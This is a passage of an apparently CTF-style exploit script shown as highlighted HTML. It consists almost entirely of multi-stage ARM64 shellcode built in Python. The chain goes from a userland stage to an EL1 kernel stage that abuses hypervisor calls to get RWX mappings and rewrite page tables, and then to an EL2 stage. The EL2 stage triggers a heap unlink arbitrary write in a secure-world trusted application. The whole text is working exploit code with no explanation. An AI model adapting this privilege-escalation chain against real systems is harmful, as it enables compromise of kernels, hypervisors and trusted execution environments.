</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x25, x25, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x25, #</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">3</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne alloc_loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x25, #2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    free_loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        // free 2, 1, 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, w25
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk w2, #0x40, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x25, #</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        sub x25, x25, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne free_loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    //trigger the vuln
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, #0xffff, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, #0xffff, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x22, #</span><span style="color:#e6db74">{</span>((TCI_Data_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x22, #</span><span style="color:#e6db74">{</span>((TCI_Data_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x22, #</span><span style="color:#e6db74">{</span>((TCI_Data_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x22, #</span><span style="color:#e6db74">{</span>(TCI_Data_addr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop_tci:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x21, x8 // dst
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x22, x8 // src
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x8, x8, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x8, #</span><span style="color:#e6db74">{</span>len(TCI_Data)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop_tci
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // unlink AAW trigger
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, #0x20, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, 0x0010, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, 0x0050, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #16] // data + 4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #20] // this is needed to get out of the freelist loop.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // get .text
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, #0x1900, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop_copy:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x21, x8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x20, x8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x8, x8, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x8, #</span><span style="color:#e6db74">{</span>len(SEL0_shellcode)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop_copy
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x05, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr x1, =0x2000000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #0x100
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">+=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x250</span><span style="color:#f92672">-</span> len(EL2_shellcode)) <span style="color:#f92672">+</span> TCI_Data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xc</span><span style="color:#f92672">+</span>EL2_shellcode
</span></span><span style="display:flex;"><span>entry <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc001e000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf0</span> 
</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc00091b8</span>
</span></span><span style="display:flex;"><span>IPA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2400</span> <span style="color:#f92672">|</span> (<span style="color:#ae81ff">0b11</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">6</span>) <span style="color:#75715e"># s2ap 11</span>
</span></span><span style="display:flex;"><span>DESC <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x100000</span>
</span></span><span style="display:flex;"><span>EL2_TEXT <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00007ffeffffa000</span>
</span></span><span style="display:flex;"><span>entry_user <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc0028000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xfd0</span>
</span></span><span style="display:flex;"><span>user_val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2403</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x0020000000000000</span><span style="color:#75715e"># ap 01</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EL2_shellcode_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffc100</span>
</span></span><span style="display:flex;"><span>EL1_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;nop&#39;</span>)<span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x400</span><span style="color:#f92672">//</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>EL1_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x0, #1 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>(IPA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>(DESC)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hvc #0x1337 // PA 0x0000000040102000 RWX
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(entry_user)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(user_val)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str x10, [x11] // IPA 0x0000000000002000 RW
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(EL2_TEXT)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>(EL2_shellcode_addr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x9, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x12, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #</span><span style="color:#e6db74">{</span>len(EL2_shellcode)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hvc #0x1337 // trigger!!!
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cnt <span style="color:#f92672">=</span> len(EL1_shellcode)
</span></span><span style="display:flex;"><span>val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040000000036483</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0 // IPA 0x36000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x9, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #</span><span style="color:#e6db74">{</span>cnt<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5 // r-x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337 // IPA 0x37000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(entry)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337 // now we can modify the kernel page table
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(val)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    sub x11, x11, #0xa0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str x10, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x123
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> bytes(ks<span style="color:#f92672">.</span>asm(shellcode)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> EL2_shellcode 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> len(payload) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x500</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x500</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> SEL0_shellcode
